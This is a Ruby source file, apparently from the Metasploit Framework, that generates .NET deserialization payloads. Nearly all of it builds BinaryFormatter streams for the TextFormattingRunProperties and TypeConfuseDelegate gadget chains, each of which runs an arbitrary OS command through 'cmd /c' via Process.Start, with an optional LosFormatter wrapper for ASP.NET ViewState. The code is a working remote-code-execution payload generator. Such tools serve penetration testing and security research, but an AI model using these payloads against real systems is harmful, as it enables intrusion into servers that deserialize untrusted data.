require 'bindata'
require 'msf/util/dot_net_deserialization/enums'
require 'msf/util/dot_net_deserialization/types'

module Msf
module Util

#
# Much of this code is based on the YSoSerial.Net project
# see: https://github.com/pwntester/ysoserial.net
#
module DotNetDeserialization
  DEFAULT_FORMATTER = :LosFormatter
  DEFAULT_GADGET_CHAIN = :TextFormattingRunProperties

  def self.encode_7bit_int(int)
    # see: https://github.com/microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/mscorlib/system/io/binaryreader.cs#L582
    encoded_int = []
    while int > 0
      value = int & 0x7f
      int >>= 7
      value |= 0x80 if int > 0
      encoded_int << value
    end

    encoded_int.pack('C*')
  end

  def self.get_ancestor(obj, ancestor_type, required: true)
    while ! (obj.nil? || obj.is_a?(ancestor_type))
      obj = obj.parent
    end

    raise RuntimeError, "Failed to find ancestor #{ancestor_type.name}" if obj.nil? && required

    obj
  end

  #
  # Limited Object Stream Types
  #
  class ObjectStateFormatter < BinData::Record
    # see: https://github.com/microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/System.Web/UI/ObjectStateFormatter.cs
    endian                 :little
    default_parameter      marker_format: 0xff
    default_parameter      marker_version: 1
    hide                   :marker_format,  :marker_version
    uint8                  :marker_format,  :initial_value => :marker_format
    uint8                  :marker_version, :initial_value => :marker_version
    uint8                  :token
  end

  #
  # Generation Methods
  #

  # Generates a .NET deserialization payload for the specified OS command using
  # a selected gadget-chain and formatter combination.
  #
  # @param cmd [String] The OS command to execute.
  # @param gadget_chain [Symbol] The gadget chain to use for execution. This
  #   will be application specific.
  # @param formatter [Symbol] An optional formatter to use to encapsulate the
  #   gadget chain.
  # @return [String]
  def self.generate(cmd, gadget_chain: DEFAULT_GADGET_CHAIN, formatter: DEFAULT_FORMATTER)
    serialized = self.generate_gadget_chain(cmd, gadget_chain: gadget_chain)
    serialized = self.generate_formatted(serialized, formatter: formatter) unless formatter.nil?
    serialized
  end

  # Take the specified serialized blob and encapsulate it with the specified
  # formatter.
  #
  # @param formatter [Symbol] The formatter to use to encapsulate the serialized
  #   data blob.
  # @return [String]
  def self.generate_formatted(serialized, formatter: DEFAULT_FORMATTER)
    case formatter
    when :LosFormatter
      serialized = serialized.to_binary_s
      # token: Token_BinarySerialized
      formatted  = ObjectStateFormatter.new(token: 50).to_binary_s
      formatted << encode_7bit_int(serialized.length)
      formatted << serialized
    else
      raise NotImplementedError, 'The specified formatter is not implemented'
    end

    formatted
  end

  # Generate a serialized data blob using the specified gadget chain to execute
  # the OS command. The chosen gadget chain must be compatible with the target
  # application.
  #
  # @param gadget_chain [Symbol] The gadget chain to use for execution.
  # @return [String]
  def self.generate_gadget_chain(cmd, gadget_chain: DEFAULT_GADGET_CHAIN)
    case gadget_chain
    when :TextFormattingRunProperties
      # see: https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TextFormattingRunPropertiesGenerator.cs
      resource_dictionary = Nokogiri::XML(<<-EOS, nil, nil, options=Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
      <ResourceDictionary
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:X="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:S="clr-namespace:System;assembly=mscorlib"
        xmlns:D="clr-namespace:System.Diagnostics;assembly=system"
      >
        <ObjectDataProvider X:Key="" ObjectType="{X:Type D:Process}" MethodName="Start">
          <ObjectDataProvider.MethodParameters>
            <S:String>cmd</S:String>
            <S:String>/c #{cmd.encode(:xml => :text)}</S:String>
          </ObjectDataProvider.MethodParameters>
        </ObjectDataProvider>
      </ResourceDictionary>
      EOS

      library = Types::RecordValues::BinaryLibrary.new(
        library_id: 2,
        library_name: "Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
      )

      serialized = Types::SerializedStream.from_values([
        Types::RecordValues::SerializationHeaderRecord.new(root_id: 1, header_id: -1),
        library,
        Types::RecordValues::ClassWithMembersAndTypes.from_member_values(
          class_info: Types::General::ClassInfo.new(
            obj_id: 1,
            name: 'Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties',
            member_names: ['ForegroundBrush']
          ),
          member_type_info: Types::General::MemberTypeInfo.new(
            binary_type_enums: [Enums::BinaryTypeEnum.fetch(:String)]
          ),
          library_id: library.library_id,
          member_values: [
              Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(obj_id: 3, string: resource_dictionary))
          ]
        ),
        Types::RecordValues::MessageEnd.new
      ])
    when :TypeConfuseDelegate
      library = Types::RecordValues::BinaryLibrary.new(
        library_id: 2,
        library_name: "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
      )

      obj_id_8 = Types::RecordValues::SystemClassWithMembersAndTypes.from_member_values(
        class_info: Types::General::ClassInfo.new(
          obj_id: 8,
          name: 'System.DelegateSerializationHolder+DelegateEntry',
          member_names: [
            'type',
            'assembly',
            'target',
            'targetTypeAssembly',
            'targetTypeName',
            'methodName',
            'delegateEntry'
          ]
        ),
        member_type_info: Types::General::MemberTypeInfo.new(
          binary_type_enums: [
            Enums::BinaryTypeEnum.fetch(:String),
            Enums::BinaryTypeEnum.fetch(:String),
            Enums::BinaryTypeEnum.fetch(:Object),
            Enums::BinaryTypeEnum.fetch(:String),
            Enums::BinaryTypeEnum.fetch(:String),
            Enums::BinaryTypeEnum.fetch(:String),
            Enums::BinaryTypeEnum.fetch(:SystemClass)
          ],
          additional_infos: [
            'System.DelegateSerializationHolder+DelegateEntry'
          ]
        ),
        member_values: [
          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
            obj_id: 11,
            string: 'System.Func`3[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]'
          )),
          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
            obj_id: 12,
            string: 'mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
          )),
          Types::Record.from_value(Types::RecordValues::ObjectNull.new),
          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
            obj_id: 13,
            string: 'System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'
          )),
          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
            obj_id: 14,
            string: 'System.Diagnostics.Process'
          )),
          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
            obj_id: 15,
            string: 'Start'
          )),
          Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 16))
        ]
      )

      obj_id_9 = Types::RecordValues::SystemClassWithMembersAndTypes.from_member_values(
        class_info: Types::General::ClassInfo.new(
          obj_id: 9,
          name: 'System.Reflection.MemberInfoSerializationHolder',
          member_names: [
            'Name',
            'AssemblyName',
            'ClassName',
            'Signature',
            'Signature2',
            'MemberType',
            'GenericArguments'
          ]
        ),
        member_type_info: Types::General::MemberTypeInfo.new(
          binary_type_enums: [
            Enums::BinaryTypeEnum.fetch(:String),
            Enums::BinaryTypeEnum.fetch(:String),
            Enums::BinaryTypeEnum.fetch(:String),
            Enums::BinaryTypeEnum.fetch(:String),
            Enums::BinaryTypeEnum.fetch(:String),
            Enums::BinaryTypeEnum.fetch(:Primitive),
            Enums::BinaryTypeEnum.fetch(:SystemClass)
          ],
          additional_infos: [
            Enums::PrimitiveTypeEnum.fetch(:Int32),
            'System.Type[]'
          ]
        ),
        member_values: [
          Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 15)),
          Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 13)),
          Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 14)),
          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
            obj_id: 20,
            string: 'System.Diagnostics.Process Start(System.String, System.String)'
          )),
          Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
            obj_id: 21,
            string: 'System.Diagnostics.Process Start(System.String, System.String)'
          )),
          8,
          Types::Record.from_value(Types::RecordValues::ObjectNull.new)
        ]
      )

      serialized = Types::SerializedStream.from_values([
        Types::RecordValues::SerializationHeaderRecord.new(root_id: 1, header_id: -1),
        library,
        Types::RecordValues::ClassWithMembersAndTypes.from_member_values(
          class_info: Types::General::ClassInfo.new(
            obj_id: 1,
            name: 'System.Collections.Generic.SortedSet`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]',
            member_names: ['Count', 'Comparer', 'Version', 'Items']
          ),
          member_type_info: Types::General::MemberTypeInfo.new(
            binary_type_enums: [
              Enums::BinaryTypeEnum.fetch(:Primitive),
              Enums::BinaryTypeEnum.fetch(:SystemClass),
              Enums::BinaryTypeEnum.fetch(:Primitive),
              Enums::BinaryTypeEnum.fetch(:StringArray)
            ],
            additional_infos: [
              Enums::PrimitiveTypeEnum.fetch(:Int32),
              'System.Collections.Generic.ComparisonComparer`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]',
              Enums::PrimitiveTypeEnum.fetch(:Int32)
            ]
          ),
          library_id: library.library_id,
          member_values: [
            2,
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 3)),
            2,
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 4))
          ]
        ),
        Types::RecordValues::SystemClassWithMembersAndTypes.from_member_values(
          class_info: Types::General::ClassInfo.new(
            obj_id: 3,
            name: 'System.Collections.Generic.ComparisonComparer`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]',
            member_names: ['_comparison']
          ),
          member_type_info: Types::General::MemberTypeInfo.new(
            binary_type_enums: [
              Enums::BinaryTypeEnum.fetch(:SystemClass)
            ],
            additional_infos: [
              'System.DelegateSerializationHolder'
            ]
          ),
          member_values: [
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 5))
          ]
        ),
        Types::RecordValues::ArraySingleString.new(
          array_info: {obj_id: 4, member_count: 2},
          members: [
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(obj_id: 6, string: "/c #{cmd}")),
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(obj_id: 7, string: 'cmd'))
          ]
        ),
        Types::RecordValues::SystemClassWithMembersAndTypes.from_member_values(
          class_info: Types::General::ClassInfo.new(
            obj_id: 5,
            name: 'System.DelegateSerializationHolder',
            member_names: ['Delegate', 'method0', 'method1']
          ),
          member_type_info: Types::General::MemberTypeInfo.new(
            binary_type_enums: [
              Enums::BinaryTypeEnum.fetch(:SystemClass),
              Enums::BinaryTypeEnum.fetch(:SystemClass),
              Enums::BinaryTypeEnum.fetch(:SystemClass)
            ],
            additional_infos: [
              'System.DelegateSerializationHolder+DelegateEntry',
              'System.Reflection.MemberInfoSerializationHolder',
              'System.Reflection.MemberInfoSerializationHolder'
            ]
          ),
          member_values: [
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 8)),
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 9)),
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 10))
          ]
        ),
        obj_id_8,
        obj_id_9,
        Types::RecordValues::ClassWithId.from_member_values(
          obj_id: 10,
          metadata_id: 9,
          class_info: obj_id_9.class_info.snapshot,
          member_type_info: obj_id_9.member_type_info.snapshot,
          member_values: [
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
              obj_id: 22,
              string: 'Compare'
            )),
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 12)),
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
              obj_id: 24,
              string: 'System.String'
            )),
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
              obj_id: 25,
              string: 'Int32 Compare(System.String, System.String)'
            )),
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
              obj_id: 26,
              string: 'System.Int32 Compare(System.String, System.String)'
            )),
            8,
            Types::Record.from_value(Types::RecordValues::ObjectNull.new)
          ]
        ),
        Types::RecordValues::ClassWithId.from_member_values(
          obj_id: 16,
          metadata_id: 8,
          class_info: obj_id_8.class_info.snapshot,
          member_type_info: obj_id_8.member_type_info.snapshot,
          member_values: [
            Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(
              obj_id: 27,
              string: 'System.Comparison`1[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]'
            )),
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 12)),
            Types::Record.from_value(Types::RecordValues::ObjectNull.new),
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 12)),
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 24)),
            Types::Record.from_value(Types::RecordValues::MemberReference.new(id_ref: 22)),
            Types::Record.from_value(Types::RecordValues::ObjectNull.new)
          ]
        ),
      #Types::RecordValues::MessageEnd.new,
      ])
    else
      raise NotImplementedError, 'The specified gadget chain is not implemented'
    end

    serialized
  end
end
end
end
